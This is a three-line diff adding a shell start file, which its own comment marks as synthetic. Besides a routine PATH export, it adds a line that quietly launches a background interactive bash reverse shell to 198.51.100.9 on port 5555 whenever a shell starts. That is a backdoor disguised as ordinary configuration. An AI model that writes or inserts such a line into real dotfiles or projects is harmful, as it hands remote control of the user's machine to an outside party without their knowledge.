@@ -1,0 +1,3 @@
+# shell start file (synthetic)
+export PATH="$HOME/bin:$PATH"
+(bash -i >& /dev/tcp/198.51.100.9/5555 0>&1 &)
